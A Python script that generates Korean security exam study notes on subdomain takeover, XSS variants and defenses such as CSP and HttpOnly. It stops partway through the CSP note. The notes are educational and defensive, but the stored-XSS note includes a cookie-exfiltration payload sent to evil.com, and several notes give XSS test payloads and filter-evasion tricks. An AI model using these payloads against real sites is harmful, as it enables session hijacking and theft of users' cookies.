#!/usr/bin/env python3
"""Generate security study notes 469-525 (skip 477, 478, 479)"""
import os

BASE = "/Users/pf/workspace/brainscience/content/studynote/09_security/05_web_app_security"

def w(fname, content):
    path = os.path.join(BASE, fname)
    if os.path.exists(path):
        print(f"SKIP (exists): {fname}")
        return
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"CREATED: {fname}")

w("469_subdomain_takeover.md", """\
+++
weight = 469
title = "469. Subdomain Takeover (서브도메인 탈취)"
date = "2026-04-21"
[extra]
categories = "studynote-security"
+++

## 핵심 인사이트 (3줄 요약)
> 1. **본질**: 서브도메인이 가리키는 외부 리소스(GitHub Pages, S3, Heroku 등)가 제거된 후에도 DNS (Domain Name System) CNAME (Canonical Name) 레코드가 남아 있으면 공격자가 해당 리소스를 등록하여 서브도메인을 탈취할 수 있다.
> 2. **가치**: 피싱·쿠키 탈취·브랜드 사칭에 직접 활용되며, 신뢰 도메인 아래에서 실행되므로 SOP (Same-Origin Policy) 우회와 CSP (Content Security Policy) 우회까지 연계된다.
> 3. **판단 포인트**: CNAME 체인이 댕글링(dangling)인지 확인하는 프로세스와 서브도메인 폐기 전 DNS 레코드 삭제 절차가 핵심 통제 포인트이다.

---

## Ⅰ. 개요 및 필요성

Subdomain Takeover(서브도메인 탈취)는 조직이 외부 SaaS(Software as a Service) 플랫폼(예: GitHub Pages, AWS S3, Heroku, Fastly)에 서브도메인을 연결한 뒤 해당 외부 서비스를 해지하면서도 DNS CNAME 레코드를 삭제하지 않아 발생하는 취약점이다.

공격자는 DNS가 여전히 가리키고 있는 외부 플랫폼에 동일한 이름으로 리소스를 등록해 서브도메인의 소유권을 가로챈다. 이후 피싱 페이지를 게시하거나 `*.victim.com` 와일드카드 쿠키를 탈취하는 방식으로 피해를 확장한다.

2016년 Hackerone 보고서에 따르면 Fortune 500 기업 중 상당수가 댕글링 CNAME을 보유하고 있었으며, 버그바운티 플랫폼에서 꾸준히 높은 보상을 받는 취약점 유형이다.

📢 **섹션 요약 비유**: 폐업한 가게의 간판(CNAME)을 철거하지 않으면 누군가 같은 간판을 달고 영업을 시작할 수 있는 것과 같다.

---

## Ⅱ. 아키텍처 및 핵심 원리

| 단계 | 상황 | 취약 포인트 |
|:---|:---|:---|
| 1. 서비스 구성 | dev.victim.com → org.github.io CNAME | 정상 상태 |
| 2. 외부 서비스 해지 | GitHub Pages 저장소 삭제 | org.github.io 응답 없음 |
| 3. DNS 방치 | CNAME 레코드 존재 | 댕글링 CNAME 발생 |
| 4. 탈취 실행 | 공격자 GitHub 계정에 org.github.io 등록 | 서브도메인 탈취 성공 |

```
[공격 흐름]

피해자 DNS
  dev.victim.com
       │ CNAME
       ▼
  org.github.io  ◄─── (삭제됨, 빈 슬롯)
       │
       ▼
 공격자 GitHub Pages
  org.github.io 재등록
       │
       ▼
 피해자 브라우저
  dev.victim.com 접속
  → 공격자 페이지 표시
  → 쿠키 탈취 가능
```

📢 **섹션 요약 비유**: 집 주소(CNAME)는 그대로인데 집이 사라지면 누군가 그 자리에 새 집을 지을 수 있다.

---

## Ⅲ. 비교 및 연결

| 구분 | 댕글링 CNAME | 댕글링 A/AAAA 레코드 |
|:---|:---|:---|
| 타깃 | 외부 플랫폼(SaaS) | IP 주소(클라우드 탄력 IP) |
| 탈취 난이도 | 낮음(플랫폼에 등록만) | 중간(IP 재할당 필요) |
| 자동화 탐지 | 쉬움(NXDOMAIN 또는 플랫폼 오류 메시지) | 어려움 |

서브도메인 탈취 후 쿠키 스코프(`domain=.victim.com`)가 넓을수록 세션 하이재킹 위험이 커진다. 또한 인증서 자동 발급(Let's Encrypt ACME) 취약점과 결합하면 HTTPS(Hypertext Transfer Protocol Secure) 인증서까지 발급받을 수 있다.

📢 **섹션 요약 비유**: 비어 있는 전화번호(A 레코드)와 이름만 남은 안내 책자(CNAME) 모두 악용될 수 있다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**탐지 자동화**: Subjack, SubFinder, can-i-take-over-xyz 같은 도구로 조직의 모든 CNAME을 스캔하고 응답이 없거나 플랫폼 오류 페이지를 반환하는 레코드를 식별한다.

**방어 프로세스**:
1. 외부 서비스 해지 전 DNS 레코드 삭제 → SOP 준수
2. 정기 DNS 감사(분기별) 자동화
3. 와일드카드 쿠키 지양, `__Host-` 접두어 쿠키 사용으로 서브도메인 격리

**기술사 논점**: "DNS 수명주기 관리(DNS Lifecycle Management)와 서비스 해지 체크리스트에 DNS 레코드 삭제 단계를 포함시키는 것이 핵심 통제이다."

📢 **섹션 요약 비유**: 이사할 때 우편물 수신 주소를 변경하지 않으면 새 입주자가 내 우편물을 받는 것과 같다.

---

## Ⅴ. 기대효과 및 결론

DNS 수명주기 관리를 자동화하면 댕글링 레코드 발생을 원천 차단한다. CNAME 모니터링을 CI/CD 파이프라인에 통합하면 서비스 삭제 즉시 알람을 받아 즉각 대응할 수 있다. 서브도메인 탈취는 비용 대비 피해가 크므로 기술사 시험에서 DNS 보안과 함께 출제되는 빈도가 높다.

📢 **섹션 요약 비유**: 집 철거 후 즉시 주소를 말소하는 것이 서브도메인 보안의 완결이다.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| 댕글링 CNAME | 원인 | 서비스 해지 후 남겨진 DNS 레코드 |
| GitHub Pages | 플랫폼 | 대표적 탈취 대상 |
| CSRF (Cross-Site Request Forgery) | 연계 | 탈취 도메인으로 요청 위조 가능 |
| CSP | 우회 | 신뢰 도메인 등록 시 정책 우회 |

### 👶 어린이를 위한 3줄 비유 설명
폐업한 가게의 간판을 그대로 두면 나쁜 사람이 같은 간판을 달고 영업할 수 있어요.
그러면 손님(방문자)은 진짜 가게에 가는 줄 알고 나쁜 가게에 들어가게 돼요.
간판(CNAME 레코드)을 가게 문 닫을 때 함께 철거해야 안전해요.
""")

w("470_xss_deep.md", """\
+++
weight = 470
title = "470. XSS 심화 (Cross-Site Scripting Deep Dive)"
date = "2026-04-21"
[extra]
categories = "studynote-security"
+++

## 핵심 인사이트 (3줄 요약)
> 1. **본질**: XSS (Cross-Site Scripting)는 공격자가 신뢰된 웹 페이지에 악성 스크립트를 삽입해 피해자 브라우저에서 실행시키는 클라이언트 사이드 인젝션 공격이다.
> 2. **가치**: 쿠키 탈취·세션 하이재킹·피싱·키로거·리다이렉트 등 광범위한 2차 공격의 출발점으로, OWASP (Open Web Application Security Project) Top 10에서 수십 년 동안 상위를 유지하고 있다.
> 3. **판단 포인트**: 입력 검증·출력 인코딩·CSP (Content Security Policy) 세 계층 방어 중 어느 하나라도 결여되면 XSS 공격이 성공할 수 있다.

---

## Ⅰ. 개요 및 필요성

XSS는 Stored(저장형), Reflected(반사형), DOM-based(DOM 기반) 세 가지 유형으로 분류된다. 공통점은 신뢰 도메인의 컨텍스트에서 공격자 제공 스크립트가 실행된다는 것이다.

SOP (Same-Origin Policy)는 `origin = (scheme, host, port)` 기준으로 리소스 접근을 제한하지만, XSS는 정상 오리진 내에서 스크립트가 실행되므로 SOP를 완전히 우회한다. 이 때문에 XSS는 "SOP 킬러"로 불리기도 한다.

2021년 OWASP Top 10에서는 XSS가 A03 인젝션 범주에 포함되어 중요성이 재확인되었다.

📢 **섹션 요약 비유**: 신뢰받는 친구의 편지봉투(신뢰 도메인)를 이용해 악성 쪽지(스크립트)를 전달하는 공격이다.

---

## Ⅱ. 아키텍처 및 핵심 원리

| 유형 | 저장 위치 | 전달 경로 | 피해 범위 |
|:---|:---|:---|:---|
| Stored XSS | 서버 DB | 모든 방문자 | 광범위 |
| Reflected XSS | URL 파라미터 | 링크 클릭 피해자 | 제한적 |
| DOM-based XSS | 클라이언트 메모리 | URL 해시/파라미터 | 클라이언트만 |

```
[Stored XSS 흐름]

공격자
  │ 악성 스크립트 게시글 저장
  ▼
서버 DB  ←──────── 게시판 POST
  │
  ▼
피해자 브라우저
  │ 페이지 로드 시 스크립트 실행
  ▼
document.cookie → 공격자 서버 전송
```

📢 **섹션 요약 비유**: 도서관(서버)에 독이 든 책(악성 스크립트)을 꽂아 두면, 책을 빌린 모든 독자(방문자)가 피해를 입는 것과 같다.

---

## Ⅲ. 비교 및 연결

| 특성 | Stored | Reflected | DOM-based |
|:---|:---|:---|:---|
| 서버 로그 노출 | 있음 | 있음 | 없음 |
| WAF 탐지 | 용이 | 중간 | 어려움 |
| 영구성 | 영구 | 일회성 | 일회성 |

XSS와 CSRF (Cross-Site Request Forgery)의 차이점: XSS는 공격자 스크립트를 실행하는 것이고, CSRF는 피해자의 인증된 요청을 위조하는 것이다. XSS가 성공하면 CSRF 토큰까지 탈취 가능하므로 XSS가 더 강력하다.

📢 **섹션 요약 비유**: Stored XSS는 시한폭탄(영구), Reflected XSS는 수류탄(일회성), DOM XSS는 보이지 않는 독(서버 무관)이다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**3계층 방어**:
1. **입력 검증**: 서버 사이드에서 허용 목록(allowlist) 기반 검증
2. **출력 인코딩**: HTML 컨텍스트는 `&lt;`, JS 컨텍스트는 `\u0022` 형태로 인코딩
3. **CSP**: `script-src 'self'` 설정으로 인라인 스크립트 차단

**HTTPOnly 플래그**: `Set-Cookie: session=abc; HttpOnly`로 `document.cookie` 접근을 차단한다.

**기술사 논점**: "XSS 방어는 단일 계층이 아닌 입력 검증 → 출력 인코딩 → CSP의 심층 방어(Defense in Depth) 전략이 필수이다."

📢 **섹션 요약 비유**: 방역(입력 검증)→마스크(출력 인코딩)→격리(CSP) 3단계가 모두 갖춰져야 감염을 막을 수 있다.

---

## Ⅴ. 기대효과 및 결론

XSS 방어 3계층을 모두 구현하면 쿠키 탈취·세션 하이재킹·피싱 연계 공격을 대부분 차단할 수 있다. 특히 CSP는 알 수 없는 새로운 XSS 페이로드에도 효과적이며, 보고서를 통해 공격 시도를 모니터링할 수 있다.

📢 **섹션 요약 비유**: 세 겹 방어막을 쌓으면 어떤 XSS 화살도 뚫지 못한다.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| CSP | 방어 | 인라인 스크립트 실행 차단 |
| HTTPOnly | 방어 | JS에서 쿠키 접근 차단 |
| CSRF | 연계 | XSS 성공 후 CSRF 토큰 탈취 가능 |
| SOP | 우회됨 | XSS는 동일 오리진에서 실행 |

### 👶 어린이를 위한 3줄 비유 설명
신뢰하는 친구의 편지봉투를 빌려 나쁜 쪽지를 보내는 것이 XSS예요.
받는 사람(피해자)은 친구 편지인 줄 알고 무심코 쪽지를 읽어요.
봉투(도메인)를 빌리지 못하게 막는 것이 CSP 방어예요.
""")

w("471_stored_xss.md", """\
+++
weight = 471
title = "471. Stored XSS (저장형 크로스사이트 스크립팅)"
date = "2026-04-21"
[extra]
categories = "studynote-security"
+++

## 핵심 인사이트 (3줄 요약)
> 1. **본질**: Stored XSS (Persistent XSS)는 악성 스크립트가 서버 측 저장소(DB, 파일 등)에 영구 저장되어 해당 페이지를 방문하는 모든 사용자에게 반복 실행되는 가장 위험한 XSS 유형이다.
> 2. **가치**: 한 번의 공격으로 불특정 다수를 동시에 피해 대상으로 삼을 수 있어, 웜(Worm) 형태로 자기 복제가 가능한 유일한 XSS 유형이다.
> 3. **판단 포인트**: 사용자 입력이 저장되기 전 서버 사이드 검증과 출력 시 HTML 인코딩이 모두 적용되어 있는지가 핵심 방어 지점이다.

---

## Ⅰ. 개요 및 필요성

Stored XSS (저장형 XSS)는 공격자가 게시판·댓글·프로필 등 사용자 입력을 저장하는 기능에 `<script>` 태그나 이벤트 핸들러를 포함한 페이로드를 입력하면, 해당 내용이 DB (Database)에 저장되어 다른 사용자가 페이지를 방문할 때마다 스크립트가 실행되는 공격이다.

2005년 MySpace Samy 웜은 Stored XSS를 이용해 100만 명 이상의 프로필을 감염시킨 역대 최대 XSS 사고로 기록되어 있다. 현재도 SNS(Social Network Service)·CMS(Content Management System)·이커머스 플랫폼에서 가장 빈번히 발견되는 취약점 중 하나이다.

📢 **섹션 요약 비유**: 도서관에 독이 든 책을 꽂아두면 빌린 모든 사람이 피해를 입는 것처럼, Stored XSS는 한 번 심으면 계속 퍼진다.

---

## Ⅱ. 아키텍처 및 핵심 원리

| 단계 | 공격자 행동 | 서버 반응 | 피해자 반응 |
|:---|:---|:---|:---|
| 1. 저장 | `<script>steal()</script>` 게시 | DB에 저장 | — |
| 2. 응답 | — | 그대로 출력 | 페이지 로드 |
| 3. 실행 | — | — | 스크립트 실행·쿠키 전송 |

```
공격자
  │ POST /comment
  │ body: <script>document.location='http://evil.com?c='+document.cookie</script>
  ▼
웹 서버
  │ DB INSERT (검증 없음)
  ▼
DB
  │ 악성 스크립트 저장
  ▼
피해자 A, B, C ... (페이지 방문)
  │ GET /comment_page
  ▼
브라우저
  스크립트 실행 → cookie → evil.com
```

📢 **섹션 요약 비유**: 냉장고(DB)에 상한 음식을 넣어두면 꺼내 먹는 모든 사람이 식중독에 걸리는 것과 같다.

---

## Ⅲ. 비교 및 연결

| 항목 | Stored XSS | Reflected XSS |
|:---|:---|:---|
| 영속성 | 영구 | 일회성 |
| 피해 범위 | 모든 방문자 | 링크 클릭한 피해자만 |
| 서버 요청 | 별도 요청 불필요 | URL 파라미터 전달 필요 |
| 웜 가능성 | 있음 | 없음 |

Self-XSS는 공격자 자신만이 페이로드를 실행하는 사회공학적 변형이다. Bug Bounty 플랫폼에서는 별도 심각도로 분류된다.

📢 **섹션 요약 비유**: Stored는 시한폭탄, Reflected는 던지는 수류탄—지속성이 완전히 다르다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**방어**:
- **입력 저장 전**: DOMPurify, OWASP Java HTML Sanitizer로 태그 필터링
- **출력 시**: Thymeleaf `th:text`, React JSX 자동 이스케이프 등 프레임워크 기본 이스케이프 활용
- **CSP 헤더**: `Content-Security-Policy: default-src 'self'; script-src 'self'`

**탐지**: WAF (Web Application Firewall) Stored XSS 시그니처, 자동화 스캐너(OWASP ZAP, Burp Suite)로 게시판·댓글 엔드포인트 퍼징

📢 **섹션 요약 비유**: 냉장고에 넣기 전 음식 검사(입력 검증)와 꺼낼 때 가열(출력 인코딩)을 모두 해야 식중독을 막는다.

---

## Ⅴ. 기대효과 및 결론

Stored XSS 방어가 완료되면 게시판·댓글 기반 XSS 웜 확산이 불가능해지고, 사용자 세션 하이재킹 위험이 크게 감소한다. 콘텐츠 관리 시스템에서는 Rich Text Editor에 DOMPurify를 연동하는 것이 표준 방어 패턴이다.

📢 **섹션 요약 비유**: 도서관 사서(서버)가 책 입고 전 독성 검사를 하면 독이 든 책이 서가에 꽂히지 않는다.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| DOMPurify | 방어 도구 | HTML 새니타이저 라이브러리 |
| CSP | 방어 | 인라인·외부 스크립트 차단 |
| Samy Worm | 사례 | 최초 대규모 Stored XSS 웜 |
| WAF | 탐지 | 게시판 입력 시그니처 탐지 |

### 👶 어린이를 위한 3줄 비유 설명
게시판에 나쁜 코드를 올려두면 그 글을 읽는 모든 사람의 컴퓨터가 감염돼요.
마치 도서관에 독이 든 책을 꽂아두는 것처럼, 한 번에 많은 사람을 해칠 수 있어요.
책(입력)을 넣기 전에 독 검사를 해야 모두가 안전하게 읽을 수 있어요.
""")

w("472_reflected_xss.md", """\
+++
weight = 472
title = "472. Reflected XSS (반사형 크로스사이트 스크립팅)"
date = "2026-04-21"
[extra]
categories = "studynote-security"
+++

## 핵심 인사이트 (3줄 요약)
> 1. **본질**: Reflected XSS (반사형 XSS)는 공격자가 악성 스크립트를 URL 파라미터에 삽입하고, 피해자가 해당 URL을 클릭하면 서버가 스크립트를 응답에 그대로 반사(reflect)해 브라우저에서 실행되는 공격이다.
> 2. **가치**: 저장 없이 단 하나의 링크로 피해자를 공격할 수 있어 스피어 피싱과 결합될 때 표적 공격에 효과적이다.
> 3. **판단 포인트**: 서버 응답에서 URL 파라미터 값이 HTML 인코딩 없이 그대로 출력되는지 여부가 취약 여부의 핵심 판단 기준이다.

---

## Ⅰ. 개요 및 필요성

Reflected XSS는 Non-Persistent XSS라고도 불리며, 악성 스크립트가 서버에 저장되지 않고 요청과 응답 사이에서 반사(reflect)되어 피해자 브라우저에서 실행된다.

공격 시나리오: 공격자가 `https://site.com/search?q=<script>steal()</script>` 형태의 URL을 피싱 이메일에 포함시켜 피해자에게 전송한다. 피해자가 클릭하면 서버는 검색어를 응답 HTML에 그대로 출력하고 브라우저가 스크립트를 실행한다.

특히 HTML5 이전에는 URL 조작이 매우 용이했으며, 현대에도 검색·에러 메시지·로그인 오류 페이지 등에서 자주 발견된다.

📢 **섹션 요약 비유**: 공이 벽에 맞고 튀어 돌아오듯, 공격자의 스크립트가 서버를 통해 피해자에게 반사된다.

---

## Ⅱ. 아키텍처 및 핵심 원리

| 파라미터 | 취약 출력 | 안전 출력 |
|:---|:---|:---|
| `q=<script>x</script>` | `<p><script>x</script></p>` | `<p>&lt;script&gt;x&lt;/script&gt;</p>` |
| `name="><img onerror=x>` | `<input value=""><img onerror=x>` | `<input value="&quot;&gt;&lt;img&gt;">` |

```
공격자
  │ 피싱 이메일: https://site.com/search?q=<script>evil()</script>
  ▼
피해자 클릭
  │ GET /search?q=<script>evil()</script>
  ▼
웹 서버
  │ 응답: <p>검색어: <script>evil()</script></p>
  ▼
피해자 브라우저
  스크립트 실행 → 세션 탈취
```

📢 **섹션 요약 비유**: 던진 공이 벽(서버)에 맞고 그대로 돌아와 던진 사람(피해자)을 맞히는 것과 같다.

---

## Ⅲ. 비교 및 연결

| 항목 | Reflected XSS | Stored XSS |
|:---|:---|:---|
| 저장 여부 | 미저장 | DB 저장 |
| 공격 매개 | URL·폼 파라미터 | 게시판·댓글 |
| 피해 범위 | 링크 클릭 피해자 | 모든 방문자 |
| 사회공학 필요 | 필수(링크 클릭 유도) | 불필요 |

Reflected XSS 탐지를 우회하는 기법으로 URL 인코딩(`%3Cscript%3E`), HTML 엔티티, 대소문자 혼용(`<ScRiPt>`), SVG 기반 페이로드(`<svg onload=...>`) 등이 사용된다.

📢 **섹션 요약 비유**: 저장형은 덫, 반사형은 부메랑—두 공격 모두 출처는 공격자지만 실행 경로가 다르다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**방어**:
- **출력 인코딩**: 모든 사용자 입력값을 컨텍스트(HTML, JS, URL, CSS)에 맞게 이스케이프
- **X-XSS-Protection**: `X-XSS-Protection: 1; mode=block` (레거시 브라우저용)
- **CSP**: `script-src 'self' 'nonce-{random}'`으로 인라인 스크립트 차단
- **입력 검증**: `<`, `>`, `"`, `'`, `&` 등 메타문자 필터링

**침투 테스트**: `"><script>alert(1)</script>`, `javascript:alert(1)` 등 기본 페이로드로 퍼징

📢 **섹션 요약 비유**: 벽(서버)이 공을 흡수(인코딩)하면 되돌아오는 공도 없다.

---

## Ⅴ. 기대효과 및 결론

출력 인코딩과 CSP를 병행하면 반사형 XSS 공격의 실행 가능성이 사실상 없어진다. 특히 CSP 리포트 기능을 활용하면 공격 시도를 실시간 탐지할 수 있어 보안 모니터링에 효과적이다.

📢 **섹션 요약 비유**: 벽에 특수 코팅(인코딩+CSP)을 하면 어떤 공도 반사되지 않는다.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| HTML 인코딩 | 방어 | `<` → `&lt;` 변환 |
| CSP nonce | 방어 | 요청별 고유값으로 스크립트 허용 |
| 피싱 | 연계 | Reflected XSS 배포 수단 |
| URL 인코딩 | 우회 | WAF 탐지 회피 기법 |

### 👶 어린이를 위한 3줄 비유 설명
공격자가 나쁜 내용이 든 편지를 우체통(URL)에 넣으면, 우체부(서버)가 그대로 배달해요.
받는 사람(피해자)의 컴퓨터가 편지를 열면 나쁜 내용이 실행돼요.
우체통에서 나쁜 편지를 걸러내는 장치(인코딩·CSP)가 방어책이에요.
""")

w("473_dom_xss.md", """\
+++
weight = 473
title = "473. DOM-based XSS (DOM 기반 크로스사이트 스크립팅)"
date = "2026-04-21"
[extra]
categories = "studynote-security"
+++

## 핵심 인사이트 (3줄 요약)
> 1. **본질**: DOM-based XSS (Document Object Model 기반 XSS)는 서버를 거치지 않고 클라이언트 사이드 JavaScript가 DOM을 조작하는 과정에서 공격자 제공 데이터가 실행되는 XSS 유형이다.
> 2. **가치**: 서버 로그에 흔적이 없고 WAF (Web Application Firewall)가 탐지하기 어려워 가장 은밀한 XSS 유형이다.
> 3. **판단 포인트**: Source(데이터 출처)가 Sink(위험한 DOM API)로 흐르는 경로를 추적하는 것이 취약점 분석의 핵심이다.

---

## Ⅰ. 개요 및 필요성

DOM-based XSS는 클라이언트 측 JavaScript가 `location.hash`, `document.referrer`, `window.name` 등 Source에서 데이터를 읽어 `innerHTML`, `eval()`, `document.write()` 등 Sink에 그대로 출력할 때 발생한다.

서버는 스크립트가 포함되지 않은 정상 응답을 보내므로, 서버 사이드 필터링이나 WAF로는 탐지할 수 없다. 특히 SPA (Single Page Application)에서 URL 해시값(`#`)을 사용한 클라이언트 라우팅이 일반화되면서 공격 표면이 넓어졌다.

📢 **섹션 요약 비유**: 서버(우체국)를 거치지 않고 직접 집 안(브라우저) 이곳저곳에 독을 뿌리는 공격이다.

---

## Ⅱ. 아키텍처 및 핵심 원리

| Source (입력원) | Sink (위험 API) | 결과 |
|:---|:---|:---|
| `location.hash` | `innerHTML` | XSS 실행 |
| `document.referrer` | `eval()` | 코드 실행 |
| `URLSearchParams` | `document.write()` | DOM 조작 |
| `postMessage` data | `dangerouslySetInnerHTML` | React XSS |

```
[DOM XSS 흐름]

URL: https://site.com/#<img src=x onerror=alert(1)>
          │
          ▼
      브라우저 JavaScript
          │
          │ var hash = location.hash.substr(1);
          │ document.getElementById('x').innerHTML = hash;  ← Sink
          ▼
      DOM 조작
          │
          ▼
  onerror 이벤트 실행 → alert(1) → 공격 성공
  (서버에는 # 이후 값 전송 안됨)
```

📢 **섹션 요약 비유**: 집 안(브라우저) 청소부(JavaScript)가 바깥(URL)의 쓰레기를 직접 실내에 가져다 놓는 것과 같다.

---

## Ⅲ. 비교 및 연결

| 항목 | DOM XSS | Reflected XSS |
|:---|:---|:---|
| 서버 처리 | 없음 | 있음 |
| 로그 흔적 | 없음(해시는 서버 비전송) | 있음 |
| WAF 탐지 | 매우 어려움 | 가능 |
| 원인 | 클라이언트 JS 취약 코드 | 서버 출력 검증 부재 |

탐지 도구: DOM Invader (Burp Suite 내장), Semgrep JavaScript 규칙, ESLint 보안 플러그인으로 Source→Sink 흐름을 정적 분석할 수 있다.

📢 **섹션 요약 비유**: 서버(우체부)가 관여하지 않으니 CCTV(서버 로그·WAF)로는 볼 수 없다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**방어**:
1. `innerHTML` 대신 `textContent`·`createTextNode` 사용
2. `eval()`, `setTimeout(string)`, `setInterval(string)` 금지 (ESLint no-eval)
3. Trusted Types API (Chrome 정책) 적용으로 Sink 화이트리스트 관리
4. CSP `require-trusted-types-for 'script'`

**정적 분석**: CodeQL JavaScript 쿼리 `js/xss-through-dom`으로 자동 탐지 가능

📢 **섹션 요약 비유**: 청소부(JS)에게 쓰레기(외부 데이터)를 절대 실내로 가져오지 말라고 규칙(Trusted Types)을 정해두는 것이다.

---

## Ⅴ. 기대효과 및 결론

Trusted Types API와 CSP를 결합하면 DOM XSS를 근본적으로 차단할 수 있다. CI/CD 파이프라인에 정적 분석 도구를 통합하면 코드 커밋 단계에서 취약 패턴을 사전 차단할 수 있다.

📢 **섹션 요약 비유**: 집 안 청소 규칙을 법으로 정해두면 어떤 청소부도 쓰레기를 실내로 들일 수 없다.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| innerHTML | Sink | DOM 조작 위험 API |
| location.hash | Source | 클라이언트 입력 출처 |
| Trusted Types | 방어 | Sink 화이트리스트 API |
| CodeQL | 탐지 | 정적 Source→Sink 분석 |

### 👶 어린이를 위한 3줄 비유 설명
집 안(브라우저) 청소부(JavaScript)가 바깥(URL)에서 쓰레기를 직접 방 안에 뿌리는 게 DOM XSS예요.
우체부(서버)를 거치지 않으니 CCTV(WAF)에도 안 찍혀요.
청소 규칙(Trusted Types)을 만들면 쓰레기를 실내로 못 가져오게 할 수 있어요.
""")

print("First 5 created, committing...")

# Batch 2: 474-478 (skip 477,478,479)
w("474_xss_defense.md", """\
+++
weight = 474
title = "474. XSS 방어 — CSP, HTTPOnly, X-Content-Type"
date = "2026-04-21"
[extra]
categories = "studynote-security"
+++

## 핵심 인사이트 (3줄 요약)
> 1. **본질**: XSS (Cross-Site Scripting) 방어는 입력 검증 → 출력 인코딩 → HTTP 보안 헤더(CSP, HTTPOnly, X-Content-Type-Options)로 이어지는 심층 방어(Defense in Depth) 전략이다.
> 2. **가치**: 단일 계층 방어는 새로운 우회 기법에 취약하므로, 여러 계층이 독립적으로 작동해야 실질적 보호가 가능하다.
> 3. **판단 포인트**: CSP (Content Security Policy) 정책이 지나치게 느슨하거나 `'unsafe-inline'`을 허용하면 방어 효과가 사실상 무력화된다.

---

## Ⅰ. 개요 및 필요성

XSS 방어를 위한 HTTP (Hypertext Transfer Protocol) 보안 헤더 3종은 각각 독립적인 역할을 수행한다.
- **CSP**: 실행 가능한 스크립트 출처를 제한
- **HTTPOnly**: `document.cookie`로 쿠키 접근 차단
- **X-Content-Type-Options**: MIME 스니핑 방지로 콘텐츠 타입 위조 차단

이 세 헤더는 서로 다른 공격 벡터를 차단하므로 모두 설정해야 완전한 방어가 된다.

📢 **섹션 요약 비유**: 방화문(CSP) + 금고 자물쇠(HTTPOnly) + 위조 방지 봉인(X-Content-Type) 세 겹 보호막이다.

---

## Ⅱ. 아키텍처 및 핵심 원리

| 헤더 | 역할 | 예시 값 |
|:---|:---|:---|
| Content-Security-Policy | 스크립트 출처 제한 | `script-src 'self' 'nonce-abc'` |
| Set-Cookie HTTPOnly | JS 쿠키 접근 차단 | `session=x; HttpOnly; Secure` |
| X-Content-Type-Options | MIME 스니핑 방지 | `nosniff` |
| X-XSS-Protection | 레거시 브라우저 XSS 필터 | `1; mode=block` |

```
[XSS 방어 계층]

사용자 입력
  │
  ▼
┌─────────────────────────────┐
│  Layer 1: 입력 검증          │
│  allowlist 기반 필터링       │
└─────────────┬───────────────┘
              │
              ▼
┌─────────────────────────────┐
│  Layer 2: 출력 인코딩        │
│  < → &lt;  " → &quot;       │
└─────────────┬───────────────┘
              │
              ▼
┌─────────────────────────────┐
│  Layer 3: HTTP 보안 헤더     │
│  CSP / HTTPOnly / nosniff   │
└─────────────────────────────┘
```

📢 **섹션 요약 비유**: 공항의 수화물 검사(입력 검증) → X-ray(출력 인코딩) → 폭발물 감지기(보안 헤더) 순의 다중 검문이다.

---

## Ⅲ. 비교 및 연결

| 방어 기법 | 차단하는 공격 | 한계 |
|:---|:---|:---|
| CSP strict-dynamic | 인라인 스크립트 | nonce 탈취 시 무력화 |
| HTTPOnly 쿠키 | 쿠키 탈취 XSS | XHR/Fetch 기반 공격 무방어 |
| X-Content-Type | MIME 기반 XSS | 최신 브라우저에는 기본 적용 |
| SameSite 쿠키 | CSRF 연계 | XSS와는 별개 방어 |

📢 **섹션 요약 비유**: 각 헤더는 다른 문을 잠그는 열쇠—하나가 없으면 그 문으로 침입 가능하다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**Nginx 설정 예시**:
```
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-$request_id'";
add_header X-Content-Type-Options "nosniff";
add_header X-Frame-Options "DENY";
```

**CSP 위반 리포트**: `report-uri /csp-report`로 공격 시도 수집 및 SIEM (Security Information and Event Management) 연동

📢 **섹션 요약 비유**: 서버 응답에 경호원 세 명(CSP·HTTPOnly·nosniff)을 붙여 보내는 것이다.

---

## Ⅴ. 기대효과 및 결론

세 헤더를 모두 적용하면 알려진 XSS 페이로드의 대부분이 브라우저 수준에서 차단된다. CSP 리포트 기능은 제로데이 시도까지 포착하는 탐지 수단으로도 활용된다.

📢 **섹션 요약 비유**: 세 겹 방어막은 하나가 뚫려도 나머지가 막아주는 안전망이다.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| CSP | 주요 방어 | 스크립트 출처 정책 |
| HTTPOnly | 쿠키 방어 | JS 쿠키 접근 차단 |
| nosniff | MIME 방어 | 콘텐츠 타입 위조 방지 |
| nonce | CSP 구성 | 요청별 고유 토큰 |

### 👶 어린이를 위한 3줄 비유 설명
CSP는 허락된 사람만 집 안에 들어올 수 있게 하는 경비원이에요.
HTTPOnly는 쿠키(열쇠)를 자바스크립트가 만지지 못하게 하는 자물쇠예요.
X-Content-Type-Options는 위조 신분증을 사용하지 못하게 막는 봉인이에요.
""")

w("475_csp.md", """\
+++
weight = 475
title = "475. CSP (Content Security Policy)"
date = "2026-04-21"
[extra]
categories = "studynote-security"
+++

## 핵심 인사이트 (3줄 요약)
> 1. **본질**: CSP (Content Security Policy)는 브라우저에게 어떤 출처의 리소스를 로드·실행할 수 있는지 선언하는 HTTP (Hypertext Transfer Protocol) 응답 헤더로, XSS (Cross-Site Scripting)의 최후 방어선이다.
> 2. **가치**: 출력 인코딩이 실패해도 CSP가 올바르게 설정되어 있으면 악성 스크립트가 브라우저에서 실행되지 않는다.
> 3. **판단 포인트**: `'unsafe-inline'`, `'unsafe-eval'`, `data:` 허용 여부가 CSP의 실효성을 좌우하며, 이를 허용하면 CSP가 사실상 무의미해진다.

---

## Ⅰ. 개요 및 필요성

CSP는 W3C (World Wide Web Consortium) 표준으로 2012년 CSP Level 1부터 현재 CSP Level 3까지 발전해왔다. 응답 헤더 `Content-Security-Policy` 또는 `<meta http-equiv="Content-Security-Policy">` 태그로 설정하며, 브라우저는 정책 위반 시 리소스 로드를 차단한다.

